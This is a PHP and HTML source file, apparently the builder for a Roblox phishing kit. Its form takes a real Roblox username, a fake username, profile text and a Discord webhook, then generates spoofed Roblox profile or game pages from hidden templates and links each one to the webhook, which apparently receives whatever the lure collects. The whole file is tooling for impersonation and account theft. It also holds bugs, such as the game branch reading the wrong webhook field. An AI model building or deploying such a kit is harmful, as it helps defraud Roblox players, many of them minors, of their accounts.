<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST'){
if(!empty($_POST['rusername'] && $_POST['fusername'] && $_POST['ddwebhook'])){
$id = rand();
$url = rand();
mkdir('users/'.$id.'/setup', 0777, true);
mkdir('tokens/'.$url.'', 0777, true);
file_put_contents('users/'.$id.'/profile.php', file_get_contents('files/profile.php'));
file_put_contents('users/'.$id.'/setup/.htaccess', 'deny from all');
file_put_contents('users/'.$id.'/setup/realusername.txt', $_POST['rusername']);
file_put_contents('users/'.$id.'/setup/fakeusername.txt', $_POST['fusername']);
file_put_contents('users/'.$id.'/setup/aboutme.txt', $_POST['aboutme']);
file_put_contents('users/'.$id.'/setup/friends.txt', $_POST['friends']);
file_put_contents('tokens/'.$url.'/webhook.txt', $_POST['ddwebhook']);
file_put_contents('users/'.$id.'/setup/link.txt', $url);
header('location: users/'.$id.'/profile');
die();
} else if(!empty($_POST['gameid'] && $_POST['dwebhook'])){
$id = rand();
$url = rand();
$privateserverlinkcode = '';
for($i = 0; $i < 32; $i++) { $privateserverlinkcode .= mt_rand(0, 9); }
$gamename = str_replace('https://www.roblox.com/games/'.$_POST['gameid'].'/','',json_decode(file_get_contents('https://www.roblox.com/places/api-get-details?assetId='.$_POST['gameid']))->Url);
mkdir('games/'.$id.'/setup', 0777, true);
mkdir('tokens/'.$url.'', 0777, true);
file_put_contents('games/'.$id.'/'.$gamename.'.php', file_get_contents('files/game.php'));
file_put_contents('games/'.$id.'/setup/.htaccess', 'deny from all');
file_put_contents('games/'.$id.'/setup/id.txt', $_POST['gameid']);
file_put_contents('tokens/'.$url.'/webhook.txt', $_POST['ddwebhook']);
file_put_contents('games/'.$id.'/setup/link.txt', $url);
header('location: games/'.$id.'/'.$gamename.'?privateServerLinkCode='.$privateserverlinkcode.'');
die();
}
}
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Profile</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div class="center">
      <h1 id="current">Profile</h1>
      <form action="" method="post" id="profile" autocomplete="off">
        <div class="txt_field">
          <input name="rusername" type="text" required>
          <span></span>
          <label>Roblox Username</label>
        </div>
        <div class="txt_field">
          <input name="fusername" type="text" required>
          <span></span>
          <label>Fake Username</label>
        </div>
        <div class="txt_field">
          <input name="aboutme" type="text" required>
          <span></span>
          <label>About Me</label>
        </div>
        <div class="txt_field">
          <input name="friends" type="text" required>
          <span></span>
          <label>friends</label>
        </div>
        <div class="txt_field">
          <input name="ddwebhook" type="text" required>
          <span></span>
          <label>Discord Webhook</label>
        </div>
        <input type="submit" value="Create">
        <div class="signup_link">
          <a onclick="game()">Create Game!</a>
        </div>
      </form>
      <form action="" method="post" id="game" autocomplete="off" style="display:none">
        <div class="txt_field">
          <input name="gameid" type="text" required>
          <span></span>
          <label>Game ID</label>
        </div>
        <div class="txt_field">
          <input name="dwebhook" type="text" required>
          <span></span>
          <label>Discord Webhook</label>
        </div>
        <input type="submit" value="Create">
        <div class="signup_link">
          <a onclick="profile()">Create Profile!</a>
        </div>
      </form>
    </div>
<script>
function game(){
document.title = 'Game';
document.getElementById('current').innerHTML = 'Game';
document.getElementById('profile').style.display = 'none';
document.getElementById('game').style.display = '';
}
function profile(){
document.title = 'Profile';
document.getElementById('current').innerHTML = 'Profile';
document.getElementById('profile').style.display = '';
document.getElementById('game').style.display = 'none';
}
</script>
  </body>
</html>